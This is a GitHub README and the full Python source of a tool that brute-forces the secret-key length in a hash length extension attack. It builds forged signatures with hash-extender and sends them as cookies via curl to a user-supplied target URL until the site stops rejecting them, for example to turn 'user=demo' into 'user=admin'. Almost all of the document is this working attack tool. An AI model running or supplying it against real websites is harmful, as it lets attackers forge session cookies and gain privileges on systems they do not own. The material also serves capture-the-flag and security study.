
##
#
https://github.com/0xHasanM/Hash-Extension-Bruter
#
##

# Hash-Extender-Bruter  
Hash-Extender-Bruter is a tool in python to bruteforce Hash-extender length and send back cookie to website  
  
## Table of Contents  
* [Features](#Features)  
* [Installation](#Installation)  
* [Usage](#Usage)  
* [Refrences](#Refrences)  
  
## Features  
1. auto detect hashes type and check if they are vulnerable  
2. send the new generated signatures to website and exclude results that contains words in resfilter option  
  
## Installation  
1. ```git clone https://github.com/0xMohammed/Hash-Extender-Bruter.git```  
2. ```cd Hash-Extender-Bruter```  
3. ```mv ./hash-extender /usr/bin```  
4. ```pip3 install -r requirements.txt```  
5. ```chmod +x ./Hash-Extender-bruter.py```  
  
## Usage  
1. ```-h : show help menu```  
2. ```-d : the original data i.e. user=demo```  
3. ```-s : signature (hash)```  
4. ```-a : data to add i.e. user=admin```  
5. ```-r : bad word i.e. 'wrong signature'```  
  
![Alt Text](https://github.com/0xMohammed/Hash-Extender-Bruter/blob/master/Images/Peek%202020-09-11%2018-45.gif)  
  
## Refrences  
[Length_extension_attack](https://en.wikipedia.org/wiki/Length_extension_attack)  
[SHA1 length extension attack on the Secure Filesystem](https://www.youtube.com/watch?v=6QQ4kgDWQ9w)  
[MD5 length extension and Blind SQL Injection - BruCON CTF part 3](https://www.youtube.com/watch?v=sMla6_4Z-CQ)  


```
#!/usr/bin/env python3
import subprocess
import sys
import shlex
import getopt
import os
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor
from requests_futures.sessions import FuturesSession
def main(argv):
   print('''
 _   _           _           _____     _                 _                  ______            _            
| | | |         | |         |  ___|   | |               (_)                 | ___ \          | |           
| |_| | __ _ ___| |__ ______| |____  _| |_ ___ _ __  ___ _  ___  _ __ ______| |_/ /_ __ _   _| |_ ___ _ __ 
|  _  |/ _` / __| '_ \______|  __\ \/ / __/ _ \ '_ \/ __| |/ _ \| '_ \______| ___ \ '__| | | | __/ _ \ '__|
| | | | (_| \__ \ | | |     | |___>  <| ||  __/ | | \__ \ | (_) | | | |     | |_/ / |  | |_| | ||  __/ |   
\_| |_/\__,_|___/_| |_|     \____/_/\_\\\__\___|_| |_|___/_|\___/|_| |_|     \____/|_|   \__,_|\__\___|_|     
                                                                                            By: 0xMohammed''')
# varaibles section
   data = ''
   signatrue = ''
   append = ''
   hashtype = ''
   resfilter = ''
   opt = ''
   hash_list = {'MD4':'md4', 'MD5':'md5', 'RIPEMD-160':'ripemd160', 'SHA-0':'sha', 'SHA-1':'sha1', 'SHA-256':'sha256', 'SHA-512':'sha512', 'Tiger-192':'tiger192v1', 'Whirlpool':'whirlpool'}
#arguments setup
   try:
      opts, args = getopt.getopt(argv,"hd:s:f:r:a:",["data=","signature=","format=", "resfilter=","append="])
   except getopt.GetoptError:
      print('Hash-extender bruteforce by 0xmohammed \n -d,--data <plain data> \n -s,--signature <signature>\n -f,--format <hash type> [optional]\n -l, --resfilter <word in Bad response>\n -a, --append <data to add>')
      sys.exit()
   for opt, arg in opts:
      if opt == '-h':
         print('Hash-extender bruteforce by 0xmohammed \n -d,--data <plain data> \n -s,--signature <signature>\n -f,--format <hash type> [optional]\n -l, --resfilter <word in Bad response>\n -a, --append <data to add>')
         sys.exit()
      elif opt in ("-d", "--data"):
         data = arg
      elif opt in ("-s", "--signature"):
         signature = arg
      elif opt in ("-f", "--format"):
         hashtype = arg
      elif opt in ("-r", "--resfilter"):
         resfilter = arg
      elif opt in ("-a", "--append"):
         append = arg
   if opt == '':
      print('Hash-extender bruteforce by 0xmohammed \n -d,--data <plain data> \n -s,--signature <signature>\n -f,--format <hash type> [optional]\n -l, --resfilter <word in Bad response>\n -a, --append <data to add>')
      sys.exit()
#hash-identifier code
   if hashtype == '':
      out = subprocess.Popen(['hashid', signature], 
           stdout=subprocess.PIPE, 
           stderr=subprocess.STDOUT)
      stdout,stderr = out.communicate()
      hashtype = str(stdout.splitlines(True)[1].rstrip()).strip("b'[+] ")
      if hashtype in hash_list:
           hashtype = hash_list[hashtype]
           print("Hash type: "+hashtype)
#hash-extender brute force code
   minl = int(input("Enter Minimum key length: "))
   maxl = int(input("Enter Maximum key length: "))
   url= input("Targted URl: ")
   Cookie_format = input("Cookie format: 'Cookie: name=$value;name2=$value2'\nuse signature and session Variables\nExample: 'Cookie: signature=$signature;session=$session'\nEnter Cookie Format: ")
   for i in tqdm (range(minl, maxl+1), desc="'Bruteforcing now PLz wait..'"):
      out = subprocess.Popen(['hash-extender', '-d', data, '-s', signature, '-f', hashtype, '-l', str(i), '-a', append], 
           stdout=subprocess.PIPE, 
           stderr=subprocess.STDOUT)
      stdout,stderr = out.communicate()
      data_list = str(str(str(stdout).replace('\\n', '\n'))[:-2]).strip("b'").strip("Type: ").strip(hashtype)[1:].split()
#curl code
      new_signature = data_list[5]
      session = data_list[8]
      Cookie = "'"+Cookie_format.strip("'")+"'"
      if '$session' in Cookie or '$signature' in Cookie:
         Cookie = Cookie.replace('$session', session)
         Cookie = Cookie.replace('$signature', new_signature)
      cmd = 'curl "{}" -H {} --silent'.format(url, Cookie)
      args = shlex.split(cmd)
      out = subprocess.Popen(args, shell=False, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
      stdout,stderr = out.communicate()
      if resfilter in str(stdout):
         continue
      else:
         break
   os.system("clear")
   print("Secret length: "+data_list[2]+"\nNew Signature: "+data_list[5]+"\nNew Cookie: "+data_list[8])
   print(stdout)
if __name__ == "__main__":
   try:
      executor = ThreadPoolExecutor(max_workers=10)
      a = executor.submit(main(sys.argv[1:]))
   except getopt.GetoptError:
      print('Hash-extender bruteforce by 0xmohammed \n -d,--data <plain data> \n -s,--signature <signature>\n -f,--format <hash type> [optional]\n -l, --resfilter <word in Bad response>\n -a, --append <data to add>')
      sys.exit()
```
